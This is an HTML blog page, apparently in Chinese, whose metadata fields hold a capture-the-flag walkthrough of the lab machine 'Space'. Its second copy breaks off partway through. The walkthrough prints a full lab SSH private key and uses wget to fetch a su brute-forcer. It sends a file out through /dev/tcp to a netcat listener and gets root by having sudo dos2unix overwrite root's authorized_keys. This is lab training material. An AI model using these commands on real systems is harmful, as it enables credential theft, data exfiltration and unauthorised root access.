@@ -1,0 +1,1240 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="
+
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+```
+
+```shell
+难度：⭐️
+知识点：信息收集，`私钥`利用，`suForce`密码爆破，`dos2unix`提权，写`公钥`
+```
+
+### 2. 信息收集
+
+##### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.31.229  08:00:27:c5:06:9a       PCS Systemtechnik GmbH
+└─# IP=192.168.31.229
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 21:18 CST
+Nmap scan report for Space (192.168.31.229)
+Host is up (0.0014s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Typing Challenge
+MAC Address: 08:00:27:C5:06:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80`端口,先看看`80`有啥东西
+
+### 3.目录扫描
+
+```shell
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+[21:18:51] Starting:
+[21:18:59] 302 -    0B  - /check.php  ->  index.php
+[21:19:03] 200 -    3KB - /index.php
+[21:19:03] 200 -    3KB - /index.php/login/
+
+#Challenge Complete!
+Congratulations! You have successfully completed the challenge.
+Your reward: /var/www/html/andeli.id_rsa
+```
+
+习惯性扫目录没啥明显有用信息，直接访问主页是打字挑战页面，根据提示复制5句话后获得提示信息：网站根目录`/var/www/html/andeli.id_rsa`下有私钥
+
+把私钥取下来
+
+```
+└─# curl http://$IP/andeli.id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### 4.获得`andeli`权限
+
+##### `私钥`利用
+
+```
+#通过私钥解出公钥
+└─#ssh-keygen -y -f <私钥>
+#私钥登陆
+#ssh <私钥账户名>@ip -i <私钥>
+```
+
+通过私钥解出公钥，再通过私钥登陆账户`andeli`
+
+```shell
+└─# echo '<私钥>' > id
+└─# chmod 600 id
+└─# ssh-keygen -y -f id
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnfC0nbu5Bq1wz718/yBkJPuKhVtKYUzkxZln7hln8AmzB+4j2d3MAO8mCtWAKPb/+8c7seVrRXhLucdxysUtW4fHPG1xNeIhMqaj5LQ3S4G7Q12TMXC+ZM+pHi0b+nUbp+C31+az22rD8DYRh/kyT9wO/07CEaV1QCtBkP0N39nLtmdEaEFUeb8dPFvAJp3Sfg6v348RTMlvlTD4YbwDc/QnXbwFSUjGPgzb8jvr2rfFIbgS5P2SoAlcJ3EC8jNno4h8Qj3IWhE9sMsR773nLnOhCkfphqvkuqIr5f5ifFJxZbAJ7evgFAkKIdPsuMgrQcflhQyQVyvu31C83K3O0k+valVARP1R2SI3bu7YMLKBXDnLWrSs/d8KwRkMJQnFx+Of09nDkhHOolw7UE8gVpw+m+/+NYjUMDWyZ3T7Gv8BRYQEvjz3YZnqExHi40uW9raI+hOzhx9m2F5xdZ3QiYLJZxJ7pLmkU1Zn4L+7tN3uXjrGGU3pPD83afW9Cu6k= andeli@Space
+└─# ssh andeli@$IP -i id
+The authenticity of host '192.168.31.229 (192.168.31.229)' can't be established.
+ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:36: [hashed name]
+    (7 additional names omitted)
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.31.229' (ED25519) to the list of known hosts.
+Linux Space 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+andeli@Space:~$ id
+uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
+```
+
+直接`私钥`去登陆获得`user.txt`
+
+##### 拿到`user.txt`
+
+```shell
+andeli@Space:~$ id
+uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
+andeli@Space:~$ cd
+andeli@Space:~$ ls
+user_data.json  user.txt
+andeli@Space:~$ cat user.txt
+flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
+```
+
+### 5.获得`a3170`权限
+
+获取`andeli`权限后发现`home`目录下有`user_data.json`文件，里面是账户密码信息，使用本机自带的`jq`提取密码字典
+
+##### 提取密码字典
+
+```shell
+#使用jq提取密码字典
+andeli@Space:~$ jq --version
+jq-1.6
+andeli@Space:~$ jq -r '.[].password' user_data.json > pass.txt
+andeli@Space:~$ cat pass.txt
+6fz9Y2qPWfwYqlIZns9Y
+9RqH4tBKCjh58K1wbtCd
+#也可以使用 grep + awk（无jq时）
+andeli@Space:~$ grep ''password':' user_data.json | awk -F ''' '{print $4}' > pass1.txt
+andeli@Space:~$ md5sum pass.txt
+8aebc48147dbc2af5f430105532fe36a  pass.txt
+andeli@Space:~$ md5sum pass1.txt
+8aebc48147dbc2af5f430105532fe36a  pass1.txt
+```
+
+##### `suForce`密码爆破
+
+```
+## Download suForce
+cd /dev/shm
+wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce'
+chmod +x suForce
+## Download Wordlist (Optional)
+wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/techyou.txt'
+wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/top12000.txt'
+## Usage
+chmod +x suForce
+./suForce -u <USER> -w <WORDLIST>
+```
+
+尝试使用`suForce`直接爆破`root`密码
+
+```shell
+kali└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.31.229 - - [23/Jun/2025 21:50:42] 'GET /suForce HTTP/1.1' 200 -
+
+andeli@Space:~$ busybox wget 192.168.31.126/suForce
+Connecting to 192.168.31.126 (192.168.31.126:80)
+suForce              100% |************************************************************************|  2430  0:00:00 ETA
+andeli@Space:~$ ls
+pass.txt  suForce  user_data.json  user.txt
+andeli@Space:~$ chmod +x suForce
+andeli@Space:~$ ./suForce -u root -w pass.txt
+            _____
+ ___ _   _ |  ___|__  _ __ ___ ___
+/ __| | | || |_ / _ \| '__/ __/ _ \
+\__ \ |_| ||  _| (_) | | | (_|  __/
+|___/\__,_||_|  \___/|_|  \___\___|
+───────────────────────────────────
+ code: d4t4s3c     version: v1.0.0
+───────────────────────────────────
+🎯 Username | root
+📖 Wordlist | pass.txt
+🔎 Status   | 199/199/100%/awmFURHhByAAlPJQKveg
+❗ Fuck!    | Password not found
+───────────────────────────────────
+#后面发现不是爆破root，是a3170账户
+andeli@Space:~$ ./suForce -u a3170 -w pass.txt
+            _____
+ ___ _   _ |  ___|__  _ __ ___ ___
+/ __| | | || |_ / _ \| '__/ __/ _ \
+\__ \ |_| ||  _| (_) | | | (_|  __/
+|___/\__,_||_|  \___/|_|  \___\___|
+───────────────────────────────────
+ code: d4t4s3c     version: v1.0.0
+───────────────────────────────────
+🎯 Username | a3170
+📖 Wordlist | pass.txt
+🔎 Status   | 111/199/55%/31703170317031703170
+💥 Password | 31703170317031703170
+───────────────────────────────────
+```
+
+测试使用`suForce`直接爆破`root、`andeli密码，把`user_data.json`文件取到本地留着备用
+
+```shell
+andeli@Space:~$ cat user_data.json > /dev/tcp/192.168.31.126/1234
+
+└─# nc -lvp 1234 > user_data.json
+listening on [any] 1234 ...
+connect to [192.168.31.126] from Space [192.168.31.229] 40782
+└─# ls user_data.json
+└─# cp user_data.json /mnt/c/Users/family/Desktop/
+
+```
+
+`/etc/passwd`发现用户`a3170`,搜索`user_data.json`有`a3170`的关键字，直接获得密码
+
+```shell
+andeli@Space:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+......
+andeli:x:1000:1000:,,,:/home/andeli:/bin/bash
+a3170:x:1001:1001:,,,:/home/a3170:/bin/bash
+andeli@Space:~$
+andeli@Space:~$ cat user_data.json | grep 3170
+    'password': '31703170317031703170',
+andeli@Space:~$ su - a3170
+Password:
+a3170@Space:~$ id
+uid=1001(a3170) gid=1001(a3170) groups=1001(a3170)
+a3170@Space:~$ cd
+a3170@Space:~$ ls
+a3170@Space:~$ sudo -l
+Matching Defaults entries for a3170 on Space:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User a3170 may run the following commands on Space:
+    (ALL) NOPASSWD: /usr/bin/dos2unix
+```
+
+拿到`a3170`的密码`a3170/31703170317031703170`，登录后可以`sudo`发运行 `/usr/bin/dos2unix`
+
+
+
+### 6.获得`root`权限
+
+`sudo`发现所有用户能够以 `root `身份运行 `/usr/bin/dos2unix`
+
+```shell
+a3170@Space:~$ sudo -l
+Matching Defaults entries for a3170 on Space:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User a3170 may run the following commands on Space:
+    (ALL) NOPASSWD: /usr/bin/dos2unix
+```
+
+查表，`dos2unix`可以写文件，现成的提权方案
+
+```shell
+#`dos2unix`提权
+LFILE1=file_to_read
+LFILE2=file_to_write
+dos2unix -f -n '$LFILE1' '$LFILE2'
+```
+
+直接写个公钥
+
+```shell
+a3170@Space:~$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/a3170/.ssh/id_rsa):
+Created directory '/home/a3170/.ssh'.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/a3170/.ssh/id_rsa
+Your public key has been saved in /home/a3170/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:knoi0lcBR1t7RVuovtT4PYTdEIUbvpxx9n83Pyh87DA a3170@Space
+The key's randomart image is:
++---[RSA 3072]----+
+|    ..o .  .o..o.|
+|     o o . ..o+  |
+|      o . .... + |
+|       o ..   = o|
+|      + S. o + O.|
+| .   o .  + o * o|
+|. o + .  ..E.o. .|
+| . o o    .o++oo+|
+|            +. .B|
++----[SHA256]-----+
+a3170@Space:~$ cd .ssh
+a3170@Space:~/.ssh$ ls
+id_rsa  id_rsa.pub
+a3170@Space:~/.ssh$ sudo dos2unix -f -n 'id_rsa.pub' '/root/.ssh/authorized_keys'
+dos2unix: converting file id_rsa.pub to file /root/.ssh/authorized_keys in Unix format...
+a3170@Space:~/.ssh$
+a3170@Space:~/.ssh$ ssh root@127.0.0.1
+Last login: Sat Jun 21 20:27:39 2025 from 192.168.3.94
+root@Space:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+##### 拿到`root.txt`
+
+```shell
+root@Space:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Space:~# cd
+root@Space:~# ls
+root.txt
+root@Space:~# cat root.txt
+flag{root-f9f8c2ea-4f00-11f0-9724-e7b0f6215b99}
+root@Space:~# cat /home/andeli/user.txt
+flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
+```
+
+。">
+<meta property="og:title" content="群主靶机 Space 20250623">
+<meta property="og:description" content="
+
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+```
+
+```shell
+难度：⭐️
+知识点：信息收集，`私钥`利用，`suForce`密码爆破，`dos2unix`提权，写`公钥`
+```
+
+### 2. 信息收集
+
+##### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.31.229  08:00:27:c5:06:9a       PCS Systemtechnik GmbH
+└─# IP=192.168.31.229
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 21:18 CST
+Nmap scan report for Space (192.168.31.229)
+Host is up (0.0014s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Typing Challenge
+MAC Address: 08:00:27:C5:06:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80`端口,先看看`80`有啥东西
+
+### 3.目录扫描
+
+```shell
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+[21:18:51] Starting:
+[21:18:59] 302 -    0B  - /check.php  ->  index.php
+[21:19:03] 200 -    3KB - /index.php
+[21:19:03] 200 -    3KB - /index.php/login/
+
+#Challenge Complete!
+Congratulations! You have successfully completed the challenge.
+Your reward: /var/www/html/andeli.id_rsa
+```
+
+习惯性扫目录没啥明显有用信息，直接访问主页是打字挑战页面，根据提示复制5句话后获得提示信息：网站根目录`/var/www/html/andeli.id_rsa`下有私钥
+
+把私钥取下来
+
+```
+└─# curl http://$IP/andeli.id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### 4.获得`andeli`权限
+
+##### `私钥`利用
+
+```
+#通过私钥解出公钥
+└─#ssh-keygen -y -f <私钥>
+#私钥登陆
+#ssh <私钥账户名>@ip -i <私钥>
+```
+
+通过私钥解出公钥，再通过私钥登陆账户`andeli`
+
+```shell
+└─# echo '<私钥>' > id
+└─# chmod 600 id
+└─# ssh-keygen -y -f id
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnfC0nbu5Bq1wz718/yBkJPuKhVtKYUzkxZln7hln8AmzB+4j2d3MAO8mCtWAKPb/+8c7seVrRXhLucdxysUtW4fHPG1xNeIhMqaj5LQ3S4G7Q12TMXC+ZM+pHi0b+nUbp+C31+az22rD8DYRh/kyT9wO/07CEaV1QCtBkP0N39nLtmdEaEFUeb8dPFvAJp3Sfg6v348RTMlvlTD4YbwDc/QnXbwFSUjGPgzb8jvr2rfFIbgS5P2SoAlcJ3EC8jNno4h8Qj3IWhE9sMsR773nLnOhCkfphqvkuqIr5f5ifFJxZbAJ7evgFAkKIdPsuMgrQcflhQyQVyvu31C83K3O0k+valVARP1R2SI3bu7YMLKBXDnLWrSs/d8KwRkMJQnFx+Of09nDkhHOolw7UE8gVpw+m+/+NYjUMDWyZ3T7Gv8BRYQEvjz3YZnqExHi40uW9raI+hOzhx9m2F5xdZ3QiYLJZxJ7pLmkU1Zn4L+7tN3uXjrGGU3pPD83afW9Cu6k= andeli@Space
+└─# ssh andeli@$IP -i id
+The authenticity of host '192.168.31.229 (192.168.31.229)' can't be established.
+ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:36: [hashed name]
+    (7 additional names omitted)
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.31.229' (ED25519) to the list of known hosts.
+Linux Space 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+andeli@Space:~$ id
+uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
+```
+
+直接`私钥`去登陆获得`user.txt`
+
+##### 拿到`user.txt`
+
+```shell
+andeli@Space:~$ id
+uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
+andeli@Space:~$ cd
+andeli@Space:~$ ls
+user_data.json  user.txt
+andeli@Space:~$ cat user.txt
+flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
+```
+
+### 5.获得`a3170`权限
+
+获取`andeli`权限后发现`home`目录下有`user_data.json`文件，里面是账户密码信息，使用本机自带的`jq`提取密码字典
+
+##### 提取密码字典
+
+```shell
+#使用jq提取密码字典
+andeli@Space:~$ jq --version
+jq-1.6
+andeli@Space:~$ jq -r '.[].password' user_data.json > pass.txt
+andeli@Space:~$ cat pass.txt
+6fz9Y2qPWfwYqlIZns9Y
+9RqH4tBKCjh58K1wbtCd
+#也可以使用 grep + awk（无jq时）
+andeli@Space:~$ grep ''password':' user_data.json | awk -F ''' '{print $4}' > pass1.txt
+andeli@Space:~$ md5sum pass.txt
+8aebc48147dbc2af5f430105532fe36a  pass.txt
+andeli@Space:~$ md5sum pass1.txt
+8aebc48147dbc2af5f430105532fe36a  pass1.txt
+```
+
+##### `suForce`密码爆破
+
+```
+## Download suForce
+cd /dev/shm
+wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce'
+chmod +x suForce
+## Download Wordlist (Optional)
+wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/techyou.txt'
+wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/top12000.txt'
+## Usage
+chmod +x suForce
+./suForce -u <USER> -w <WORDLIST>
+```
+
+尝试使用`suForce`直接爆破`root`密码
+
+```shell
+kali└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.31.229 - - [23/Jun/2025 21:50:42] 'GET /suForce HTTP/1.1' 200 -
+
+andeli@Space:~$ busybox wget 192.168.31.126/suForce
+Connecting to 192.168.31.126 (192.168.31.126:80)
+suForce              100% |************************************************************************|  2430  0:00:00 ETA
+andeli@Space:~$ ls
+pass.txt  suForce  user_data.json  user.txt
+andeli@Space:~$ chmod +x suForce
+andeli@Space:~$ ./suForce -u root -w pass.txt
+            _____
+ ___ _   _ |  ___|__  _ __ ___ ___
+/ __| | | || |_ / _ \| '__/ __/ _ \
+\__ \ |_| ||  _| (_) | | | (_|  __/
+|___/\__,_||_|  \___/|_|  \___\___|
